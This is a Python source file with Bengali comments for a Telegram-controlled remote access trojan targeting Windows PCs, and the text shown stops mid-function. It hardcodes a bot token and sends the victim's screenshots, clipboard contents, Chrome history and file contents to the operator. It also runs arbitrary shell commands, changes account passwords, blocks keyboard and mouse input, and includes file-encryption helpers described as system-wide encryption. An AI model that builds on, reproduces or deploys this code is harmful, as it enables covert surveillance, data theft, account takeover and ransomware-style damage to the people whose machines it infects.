# --- START OF FILE Tast-2.py (Corrected and Upgraded with System-Wide Encryption) ---
# Webcam and Audio Recording features have been removed to reduce file size.

import asyncio
import telegram
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, Application
import psutil
from PIL import ImageGrab
import os
import io
import time
import subprocess
import shutil
import ctypes # Wallpaper এবং Input লকিং এর জন্য
import requests # URL থেকে ফাইল ডাউনলোডের জন্য
import getpass # ইউজারনেম জানার জন্য
from telegram import Update
from typing import Final, Any
from threading import Thread
import pyperclip # ক্লিপবোর্ড এর জন্য
import pygame # অডিও চালানোর জন্য
from cryptography.fernet import Fernet # এনক্রিপশনের জন্য

# --- ব্রাউজার হিস্টোরির জন্য লাইব্রেরি ---
import sqlite3
import datetime

# --- আপনার প্রদত্ত তথ্য ---
BOT_TOKEN: Final[str] = '7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk'
AUTHORIZED_CHAT_ID: Final[int] = 2139008203

# --- গ্লোবাল ভেরিয়েবল ---
INPUT_LOCK_STATUS = False # ইনপুট লকের স্ট্যাটাস
SPI_SETDESKWALLPAPER = 0x0014
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02
MB_ICONWARNING = 0x30 # পপ-আপ এর জন্য
MB_OK = 0x0 # পপ-আপ এর জন্য
KEY_FILE_NAME = "secret.key"

# --- ইউটিলিটি ফাংশন ---

def is_running_as_admin() -> bool:
    """চেক করে প্রোগ্রামটি অ্যাডমিন প্রিভিলেজে চলছে কিনা। (Windows-এর জন্য)"""
    if os.name == 'nt':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    return True

def get_logged_in_user():
    """বর্তমানে লগইন করা ইউজারের নাম দেয়।"""
    try:
        return getpass.getuser()
    except Exception:
        return None

def get_all_users():
    """সিস্টেমের সমস্ত লোকাল ইউজারদের তালিকা দেয়।"""
    try:
        result = subprocess.run('net user', shell=True, check=True, capture_output=True, text=True)
        output = result.stdout
        user_lines = output.split('\n')[4:-2]
        all_users = []
        for line in user_lines:
            all_users.extend(user for user in line.split() if user)
        return all_users
    except (subprocess.CalledProcessError, FileNotFoundError):
        return []

def change_password_windows(username, password):
    """নির্দিষ্ট ইউজারের পাসওয়ার্ড পরিবর্তন করে (Windows API)।"""
    try:
        if not password:
            return "Error: Password cannot be empty."

        command = f'net user "{username}" "{password}"'
        subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return f"Successfully changed the password for '{username}'."

    except subprocess.CalledProcessError as e:
        return f"An error occurred: Please ensure 'Run as administrator'. Error: {e.stderr}"
    except FileNotFoundError:
        return "Error: 'net' command not found."

def set_wallpaper_windows(image_path: str) -> bool:
    """Windows API ব্যবহার করে ডেস্কটপ ওয়ালপেপার পরিবর্তন করে।"""
    try:
        success = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        return bool(success)
    except Exception as e:
        print(f"Wallpaper পরিবর্তন ব্যর্থ: {e}")
        return False

def get_drive_list_windows():
    """Windows-এ সমস্ত সক্রিয় ড্রাইভের তালিকা তৈরি করে।"""
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for i in range(26):
        if (bitmask >> i) & 1:
            drive_letter = chr(65 + i) + ":\\"
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive_letter)
            if drive_type in (2, 3):
                drives.append(drive_letter)
    return drives

# --- এনক্রিপশন/ডিক্রিপশন ইউটিলিটি ---

def setup_key():
    """এনক্রিপশন কী তৈরি বা লোড করে।"""
    key_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), KEY_FILE_NAME)
    if not os.path.exists(key_file_path):
        key = Fernet.generate_key()
        with open(key_file_path, "wb") as key_file:
            key_file.write(key)
        print(f"🔑 {KEY_FILE_NAME} তৈরি হয়েছে: {key_file_path}")
    else:
        print(f"⚠️ {KEY_FILE_NAME} আগেই আছে: {key_file_path}")
    return open(key_file_path, "rb").read()

def load_key():
    """এনক্রিপশন কী লোড করে।"""
    key_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), KEY_FILE_NAME)
    if not os.path.exists(key_file_path):
        return None # Key নেই
    return open(key_file_path, "rb").read()

def process_file_fernet(filepath, fernet_instance, mode='encrypt'):
    """একক ফাইল এনক্রিপ্ট বা ডিক্রিপ্ট করে।"""
    base_path = os.path.dirname(os.path.abspath(__file__))
    # secret.key ফাইলটিকে স্কিপ করে
    if os.path.basename(filepath) == KEY_FILE_NAME and os.path.dirname(filepath) == base_path:
        return f"Skipped Key File: {filepath}"

    try:
        with open(filepath, "rb") as file:
            data = file.read()

        if mode == 'encrypt':
            processed_data = fernet_instance.encrypt(data)
        elif mode == 'decrypt':
            processed_data = fernet_instance.decrypt(data)

        with open(filepath, "wb") as file:
            file.write(processed_data)
        return f"✅ {mode.capitalize()}ed: {filepath}"

    except Exception as e:
        return f"❌ {mode.capitalize()}ion Failed: {filepath} - {e}"


# --- ১. অ্যাডভান্সড মনিটরিং হ্যান্ডলার ---
async def send_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    cpu_usage = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    status_message = (
        f"🖥️ <b>সিস্টেম স্ট্যাটাস রিপোর্ট</b> 🖥️\n"
        f"• CPU ব্যবহার: {cpu_usage:.1f}%\n"
        f"• RAM ব্যবহার: {ram.percent:.1f}% ({ram.used / (1024**3):.2f} GB / {ram.total / (1024**3):.2f} GB)\n"
        f"• ডিস্ক ব্যবহার: {disk.percent:.1f}% ({disk.used / (1024**3):.2f} GB / {disk.total / (1024**3):.2f} GB)\n"
        f"• চলমান প্রসেস সংখ্যা: {len(psutil.pids())}"
    )
    await context.bot.send_message(chat_id=chat_id, text=status_message, parse_mode='HTML')

async def active_apps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বর্তমানে চলমান অ্যাপ্লিকেশনগুলির সম্পূর্ণ তালিকা রিপোর্ট করে। (HTML ফরম্যাটে)"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    process_list = []
    try:
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                process_list.append(f"PID: {proc.info['pid']} | Name: {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied): continue
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ প্রসেস তালিকা তৈরিতে গুরুতর ত্রুটি: {e}", parse_mode='HTML')
        return

    message_chunks = []
    header = f"<b>🛠️ সক্রিয় প্রক্রিয়া ({len(process_list)} টি)</b>:\n"
    current_chunk = header

    for line in process_list:
        new_line = line + "\n"
        if len(current_chunk) + len(new_line) > 4000:
            message_chunks.append(current_chunk)
            current_chunk = ""
        current_chunk += new_line
    message_chunks.append(current_chunk)

    for chunk in message_chunks:
        await context.bot.send_message(chat_id=chat_id, text=chunk, parse_mode='HTML')

async def check_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ক্লিপবোর্ডের শেষ কপি করা **সম্পূর্ণ** টেক্সট পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            message_chunks = []
            max_len = 4000

            if len(clipboard_content) > max_len:
                for i in range(0, len(clipboard_content), max_len):
                    message_chunks.append(clipboard_content[i:i + max_len])

                await context.bot.send_message(chat_id=chat_id, text=f"📋 <b>ক্লিপবোর্ড কন্টেন্ট (মোট {len(clipboard_content)} ক্যারেক্টার):</b>", parse_mode='HTML')
                for chunk in message_chunks:
                     await context.bot.send_message(chat_id=chat_id, text=f"<pre>{chunk}</pre>", parse_mode='HTML')
            else:
                 await context.bot.send_message(chat_id=chat_id, text=f"📋 <b>ক্লিপবোর্ড কন্টেন্ট:</b>\n<pre>{clipboard_content}</pre>", parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id=chat_id, text="ক্লিপবোর্ডে কোনো টেক্সট নেই বা অ্যাক্সেস করা যাচ্ছে না।", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"ক্লিপবোর্ড অ্যাক্সেস করতে ত্রুটি: {e}", parse_mode='HTML')

async def take_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """স্ক্রিনশট নিয়ে টেলিগ্রামে পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        await context.bot.send_photo(chat_id=chat_id, photo=img_byte_arr, caption="📷 রিমোট স্ক্রিনশট")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"স্ক্রিনশট নিতে সমস্যা হয়েছে: {e}", parse_mode='HTML')

async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নির্দিষ্ট ডিরেক্টরির ফাইল ও ফোল্ডারের তালিকা দেখায় বা সমস্ত ড্রাইভ দেখায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    target_path = " ".join(context.args) if context.args else ""

    file_list = []

    try:
        if not target_path:
            if os.name == 'nt':
                drives = get_drive_list_windows()
                if drives:
                    file_list.append("📁 <b>Available Drives:</b>\n")
                    for drive in drives:
                        file_list.append(f"  [DRIVE] 🖴 <code>{drive}</code>")
                else:
                     file_list.append("❌ কোনো ড্রাইভ খুঁজে পাওয়া যায়নি।")
            else:
                target_path = os.path.expanduser('~')

        if target_path and os.path.isdir(target_path):
            file_list.append(f"📁 <b>Current Dir:</b> <code>{target_path}</code>\n")

            if target_path != os.path.abspath(os.sep) and os.name != 'nt' or (os.name == 'nt' and target_path.strip().lower() != os.path.abspath(target_path).split(os.sep)[0].lower()):
                 file_list.append(f"  [DIR] 📁 <code>..</code> (Up)")

            entries = os.listdir(target_path)
            folders = [e for e in entries if os.path.isdir(os.path.join(target_path, e))]
            files = [e for e in entries if os.path.isfile(os.path.join(target_path, e))]

            for folder in folders:
                file_list.append(f"  [DIR] 📁 <code>{folder}</code>")

            for file in files:
                file_list.append(f"  [FILE] 📄 <code>{file}</code>")

        elif target_path and not os.path.exists(target_path):
             await context.bot.send_message(chat_id=chat_id, text=f"❌ ডিরেক্টরি খুঁজে পাওয়া যায়নি: <code>{target_path}</code>", parse_mode='HTML')
             return

        message_chunks = []
        current_chunk = ""

        for line in file_list:
            new_line = line + "\n"
            if len(current_chunk) + len(new_line) > 4000:
                message_chunks.append(current_chunk)
                current_chunk = ""
            current_chunk += new_line
        message_chunks.append(current_chunk)

        for chunk in message_chunks:
            await context.bot.send_message(chat_id=chat_id, text=chunk, parse_mode='HTML')


    except PermissionError:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ অ্যাক্সেস ডিনাইড: ডিরেক্টরিটি দেখার পারমিশন নেই। <code>{target_path}</code>", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ফাইল সিস্টেম ব্রাউজারে ত্রুটি: {e}", parse_mode='HTML')

async def open_file_remote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """টার্গেট কম্পিউটারে নির্দিষ্ট ফাইল বা অ্যাপ্লিকেশন ওপেন করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: 📂 <code>/open_file [ফাইল বা অ্যাপ্লিকেশনের সম্পূর্ণ পাথ]</code>", parse_mode='HTML')
        return

    target_path = " ".join(context.args)

    if not os.path.exists(target_path):
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ফাইল/অ্যাপ্লিকেশন খুঁজে পাওয়া যায়নি: <code>{target_path}</code>", parse_mode='HTML')
        return

    try:
        if os.name == 'nt':
            os.startfile(target_path)
        elif os.uname().sysname == 'Darwin':
            subprocess.run(['open', target_path])
        else:
            subprocess.run(['xdg-open', target_path])

        await context.bot.send_message(chat_id=chat_id, text=f"✅ <b>সফলভাবে ওপেন করা হয়েছে:</b> <code>{target_path}</code>", parse_mode='HTML')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ফাইল ওপেন করতে ত্রুটি: {e}", parse_mode='HTML')

async def view_file_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নির্দিষ্ট টেক্সট ফাইলের কন্টেন্ট পড়ে টেলিগ্রামে পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: 📄 <code>/cat [ফাইলটির সম্পূর্ণ পাথ]</code>", parse_mode='HTML')
        return

    target_path = " ".join(context.args)

    if not os.path.exists(target_path):
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ফাইল খুঁজে পাওয়া যায়নি: <code>{target_path}</code>", parse_mode='HTML')
        return

    if os.path.isdir(target_path):
        await context.bot.send_message(chat_id=chat_id, text=f"❌ <code>{target_path}</code> একটি ডিরেক্টরি, ফাইল নয়।", parse_mode='HTML')
        return

    file_size = os.path.getsize(target_path)
    if file_size > 500 * 1024:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ ফাইলটি খুব বড় ({file_size / 1024:.2f} KB)। নিরাপত্তার কারণে ব্লক করা হলো।", parse_mode='HTML')
        return

    try:
        with open(target_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        message_chunks = []
        max_len = 4000 - 15

        for i in range(0, len(content), max_len):
            chunk = content[i:i + max_len]
            message_chunks.append(f"<code>{chunk}</code>")

        await context.bot.send_message(chat_id=chat_id, text=f"✅ <b>ফাইল কন্টেন্ট:</b> <code>{target_path}</code>", parse_mode='HTML')

        for chunk in message_chunks:
            await context.bot.send_message(chat_id=chat_id, text=chunk, parse_mode='HTML')


    except PermissionError:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ অ্যাক্সেস ডিনাইড: ফাইলটি পড়ার পারমিশন নেই। **অ্যাডমিন হিসেবে রান করা নিশ্চিত করুন।**", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ ফাইল পড়ার ত্রুটি: {e}", parse_mode='HTML')

def get_chrome_datetime(chromedate):
    """ক্রোমের টাইমস্ট্যাম্পকে সাধারণ datetime অবজেক্টে রূপান্তর করে।"""
    if chromedate != 86400000000 and chromedate > 0:
        try:
            return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)
        except Exception:
            return "Invalid Time"
    return "N/A"

async def get_browser_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """জনপ্রিয় ব্রাউজারের ভিজিট করা ওয়েবসাইটের তালিকা পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    await context.bot.send_message(chat_id=chat_id, text="⏳ ব্রাউজার হিস্টোরি খোঁজা হচ্ছে...", parse_mode='HTML')

    history_data = "<b>🌐 ব্রাউজার হিস্টোরি রিপোর্ট</b>\n\n"
    found_history = False

    if os.name == 'nt':
        try:
            chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'History')
            if os.path.exists(chrome_path):
                temp_db_path = os.path.join(os.path.dirname(__file__), "TempChromeHistory.db")
                shutil.copyfile(chrome_path, temp_db_path)

                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 30")

                chrome_results = cursor.fetchall()
                conn.close()
                os.remove(temp_db_path)

                if chrome_results:
                    found_history = True
                    history_data += "<b>--- গুগল ক্রোম ---</b>\n"
                    for url, title, last_visit_time in chrome_results:
                        visit_time = get_chrome_datetime(last_visit_time)
                        time_str = visit_time.strftime('%Y-%m-%d %H:%M') if isinstance(visit_time, datetime.datetime) else visit_time
                        history_data += f"• <b>{title if title else 'No Title'}</b>\n  <a href='{url}'>{url[:70]}...</a>\n  <i>({time_str})</i>\n"
                    history_data += "\n"
        except Exception as e:
            history_data += f"⚠️ ক্রোম হিস্টোরি পড়তে সমস্যা: {e}\n"

    if not found_history:
        await context.bot.send_message(chat_id=chat_id, text="❌ কোনো ব্রাউজারের হিস্টোরি খুঁজে পাওয়া যায়নি বা পড়া সম্ভব হয়নি।", parse_mode='HTML')
        return

    max_len = 4000
    for i in range(0, len(history_data), max_len):
        await context.bot.send_message(chat_id=chat_id, text=history_data[i:i+max_len], parse_mode='HTML', disable_web_page_preview=True)

async def current_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বর্তমানে লগইন করা ইউজারের নাম দেখায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    current = get_logged_in_user()
    if current:
        await context.bot.send_message(chat_id=chat_id, text=f"👤 <b>বর্তমানে লগইন করা ইউজার:</b> <code>{current}</code>", parse_mode='HTML')
    else:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ বর্তমানে লগইন করা ইউজারকে খুঁজে পাওয়া যায়নি।", parse_mode='HTML')

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """সিস্টেমে থাকা সমস্ত ইউজারের নাম দেখায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    all_users = get_all_users()
    current = get_logged_in_user()

    if not all_users:
        await context.bot.send_message(chat_id=chat_id, text="❌ কোনো লোকাল ইউজার খুঁজে পাওয়া যায়নি। **অ্যাডমিন হিসেবে রান করা নিশ্চিত করুন।**", parse_mode='HTML')
        return

    user_list_str = "👥 <b>সিস্টেমের সমস্ত লোকাল ইউজার:</b>\n"
    for user in all_users:
        if user == current:
            user_list_str += f"✅ <code>{user}</code> (বর্তমানে লগইন)\n"
        else:
            user_list_str += f"• <code>{user}</code>\n"

    await context.bot.send_message(chat_id=chat_id, text=user_list_str, parse_mode='HTML')


async def change_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """নির্দিষ্ট ইউজারের পাসওয়ার্ড পরিবর্তন করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not is_running_as_admin():
        await context.bot.send_message(chat_id=chat_id, text="❌ পাসওয়ার্ড পরিবর্তন করার জন্য ক্লায়েন্টকে **অ্যাডমিনিস্ট্রেটর** হিসেবে চালাতে হবে।", parse_mode='HTML')
        return

    if len(context.args) < 2:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: 🔑 <code>/change_pass [ইউজারনেম] [নতুন_পাসওয়ার্ড]</code>", parse_mode='HTML')
        return

    username = context.args[0]
    new_password = context.args[1]

    await context.bot.send_message(chat_id=chat_id, text=f"⏳ ইউজার <code>{username}</code> এর পাসওয়ার্ড পরিবর্তন করা হচ্ছে...", parse_mode='HTML')

    result_message = change_password_windows(username, new_password)

    if "Successfully changed" in result_message:
         await context.bot.send_message(chat_id=chat_id, text=f"✅ <b>পাসওয়ার্ড পরিবর্তন সফল!</b>\n{result_message}", parse_mode='HTML')
    else:
         await context.bot.send_message(chat_id=chat_id, text=f"❌ <b>পাসওয়ার্ড পরিবর্তন ব্যর্থ!</b>\n{result_message}", parse_mode='HTML')

async def remote_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """রিমোট কম্পিউটারে সরাসরি শেল কমান্ড রান করে এবং আউটপুট পাঠায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(
            chat_id=chat_id,
            text="ব্যবহারের নিয়ম: 💻 <code>/cmd [আপনার কমান্ড]</code>\nউদাহরণ: <code>/cmd ipconfig</code>",
            parse_mode='HTML'
        )
        return

    command = " ".join(context.args)
    await context.bot.send_message(chat_id=chat_id, text=f"⏳ কমান্ড এক্সিকিউট করা হচ্ছে:\n<code>{command}</code>", parse_mode='HTML')

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            timeout=30,
            check=False
        )

        output = ""
        if result.stdout:
            try:
                output += result.stdout.decode('cp437')
            except UnicodeDecodeError:
                output += result.stdout.decode('utf-8', errors='ignore')

        if result.stderr:
            output += "\n--- COMMAND ERRORS ---\n"
            try:
                output += result.stderr.decode('cp437')
            except UnicodeDecodeError:
                output += result.stderr.decode('utf-8', errors='ignore')

        if not output.strip():
            output = "✅ কমান্ডটি সফলভাবে রান হয়েছে কিন্তু কোনো আউটপুট দেয়নি।"

    except subprocess.TimeoutExpired:
        output = "❌ ত্রুটি: কমান্ডটি ৩০ সেকেন্ডের মধ্যে শেষ হয়নি (Timeout)।"
    except Exception as e:
        output = f"❌ কমান্ড রান করতে একটি অপ্রত্যাশিত ত্রুটি ঘটেছে: {e}"

    max_len = 4000
    for i in range(0, len(output), max_len):
        chunk = output[i:i + max_len]
        await context.bot.send_message(chat_id=chat_id, text=f"<pre>{chunk}</pre>", parse_mode='HTML')

async def set_wallpaper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """URL থেকে ছবি ডাউনলোড করে ওয়ালপেপার হিসেবে সেট করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: 🖼️ <b>/set_wallpaper [ছবির সরাসরি URL]</b>", parse_mode='HTML')
        return

    image_url = context.args[0]
    temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp_wallpaper")
    os.makedirs(temp_dir, exist_ok=True)
    temp_file_path = os.path.join(temp_dir, "new_wallpaper.jpg")

    await context.bot.send_message(chat_id=chat_id, text="⏳ ছবিটি ডাউনলোড হচ্ছে...", parse_mode='HTML')

    try:
        response = requests.get(image_url, stream=True)
        response.raise_for_status()

        with open(temp_file_path, 'wb') as file:
            download_limit = 1024 * 1024 * 5
            for chunk in response.iter_content(chunk_size=1024):
                if file.tell() >= download_limit:
                    break
                file.write(chunk)

        if set_wallpaper_windows(temp_file_path):
            await context.bot.send_message(chat_id=chat_id, text="✅ <b>ওয়ালপেপার সফলভাবে পরিবর্তন করা হয়েছে!</b>", parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id=chat_id, text="❌ ওয়ালপেপার পরিবর্তন ব্যর্থ। **অ্যাডমিন হিসেবে রান করা নিশ্চিত করুন।**", parse_mode='HTML')

    except requests.exceptions.RequestException:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ URL ডাউনলোড ত্রুটি: লিংকটি সঠিক নয় বা অ্যাক্সেস করা যাচ্ছে না।", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"ফাইল সেভ বা সেট করতে ত্রুটি: {e}", parse_mode='HTML')
    finally:
        if os.path.exists(temp_file_path):
             os.remove(temp_file_path)

async def play_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """URL থেকে অডিও ফাইল ডাউনলোড করে টার্গেট কম্পিউটারে বাজায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if not context.args:
        await context.bot.send_message(
            chat_id=chat_id,
            text="ব্যবহারের নিয়ম: 🎵 <b>/play_audio [অডিও ফাইলের সরাসরি URL]</b>",
            parse_mode='HTML'
        )
        return

    audio_url = context.args[0]

    temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp_audio")
    os.makedirs(temp_dir, exist_ok=True)
    temp_file_path = os.path.join(temp_dir, "remote_audio.mp3")

    await context.bot.send_message(chat_id=chat_id, text="⏳ অডিও ডাউনলোড ও বাজানোর প্রস্তুতি নিচ্ছে...", parse_mode='HTML')

    try:
        response = requests.get(audio_url, stream=True)
        response.raise_for_status()

        with open(temp_file_path, 'wb') as file:
            download_limit = 1024 * 1024 * 10
            for chunk in response.iter_content(chunk_size=1024):
                if file.tell() >= download_limit:
                    break
                file.write(chunk)

        def play_and_cleanup(path):
            try:
                if not pygame.mixer.get_init():
                    pygame.mixer.init()

                pygame.mixer.music.load(path)
                pygame.mixer.music.play()

                while pygame.mixer.music.get_busy():
                    time.sleep(0.1)

            except Exception as e:
                print(f"অডিও বাজাতে ব্যর্থ: {e}")
            finally:
                if os.path.exists(path):
                    os.remove(path)

        Thread(target=play_and_cleanup, args=(temp_file_path,)).start()

        await context.bot.send_message(chat_id=chat_id, text="✅ <b>অডিও প্লে করা শুরু হয়েছে!</b>", parse_mode='HTML')

    except requests.exceptions.RequestException:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ URL ডাউনলোড ত্রুটি: লিংকটি সঠিক নয় বা অ্যাক্সেস করা যাচ্ছে না।", parse_mode='HTML')
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"অডিও সেটআপ/ডাউনলোড ত্রুটি: {e}", parse_mode='HTML')

async def stop_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বর্তমানে বাজতে থাকা অডিও বন্ধ করে।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    try:
        if pygame.mixer.music.get_busy():
            pygame.mixer.music.stop()
            await context.bot.send_message(chat_id=chat_id, text="🔇 <b>অডিও প্লেব্যাক বন্ধ করা হয়েছে।</b>", parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id=chat_id, text="⚠️ <b>বর্তমানে কোনো অডিও বাজছে না।</b>", parse_mode='HTML')

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"অডিও বন্ধ করতে ত্রুটি: {e}", parse_mode='HTML')

def lock_input_windows(duration: int):
    """নির্দিষ্ট সময়ের জন্য মাউস ও কীবোর্ড লক করে (Windows API)।"""
    global INPUT_LOCK_STATUS

    try:
        ctypes.windll.user32.BlockInput(True)
        INPUT_LOCK_STATUS = True

        time.sleep(duration)

        ctypes.windll.user32.BlockInput(False)
        INPUT_LOCK_STATUS = False

    except Exception as e:
        print(f"লকিং লজিক ব্যর্থ: {e}")
        INPUT_LOCK_STATUS = False
        ctypes.windll.user32.BlockInput(False)

async def lock_keyboard_mouse(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if INPUT_LOCK_STATUS:
        await context.bot.send_message(chat_id=chat_id, text="❌ ইনপুট ইতিমধ্যেই লক করা আছে।", parse_mode='HTML')
        return

    if not context.args or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: <code>/lock_input [সময় সেকেন্ডে]</code>। যেমন: <code>/lock_input 300</code> (৫ মিনিটের জন্য)", parse_mode='HTML')
        return

    duration = int(context.args[0])
    if duration > 3600: duration = 3600

    await context.bot.send_message(chat_id=chat_id, text=f"🔒 <b>কম্পিউটার লক করা হচ্ছে!</b> {duration} সেকেন্ডের জন্য কীবোর্ড এবং মাউস ইনপুট ব্লক করা হলো।", parse_mode='HTML')

    Thread(target=lock_input_windows, args=(duration,)).start()

async def unlock_keyboard_mouse(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    ctypes.windll.user32.BlockInput(False)
    global INPUT_LOCK_STATUS
    INPUT_LOCK_STATUS = False

    await context.bot.send_message(chat_id=chat_id, text="🔓 <b>কম্পিউটার আনলক করা হয়েছে!</b> কীবোর্ড এবং মাউস ইনপুট পুনরায় চালু করা হলো।", parse_mode='HTML')

async def lock_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """উইন্ডোজকে সাথে সাথে লক স্ক্রিনে নিয়ে যায়।"""
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return

    if os.name == 'nt':
        try:
            ctypes.windll.user32.LockWorkStation()
            await context.bot.send_message(chat_id=chat_id, text="🔒 <b>কম্পিউটার সফলভাবে লক স্ক্রিনে পাঠানো হয়েছে।</b>", parse_mode='HTML')
        except Exception as e:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ কম্পিউটার লক স্ক্রিন ব্যর্থ: {e}", parse_mode='HTML')
    else:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ এই ফিচারটি শুধুমাত্র উইন্ডোজ-এ সমর্থিত।", parse_mode='HTML')

async def shutdown_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    await context.bot.send_message(chat_id=chat_id, text="⚠️ সতর্কবার্তা: কম্পিউটারটি ১ মিনিটের মধ্যে বন্ধ হবে।", parse_mode='HTML')
    if os.name == 'nt': os.system('shutdown /s /t 60')
    elif os.name == 'posix': os.system('sudo shutdown -h +1')

async def restart_pc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    await context.bot.send_message(chat_id=chat_id, text="⚠️ সতর্কবার্তা: কম্পিউটারটি ১ মিনিটের মধ্যে রিস্টার্ট হবে।", parse_mode='HTML')
    if os.name == 'nt': os.system('shutdown /r /t 60')
    elif os.name == 'posix': os.system('sudo shutdown -r +1')

async def kill_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id != AUTHORIZED_CHAT_ID: return
    if not context.args:
        await context.bot.send_message(chat_id=chat_id, text="ব্যবহারের নিয়ম: <code>/kill [প্রসেসের নাম বা PID]</code>", parse_mode='HTML')
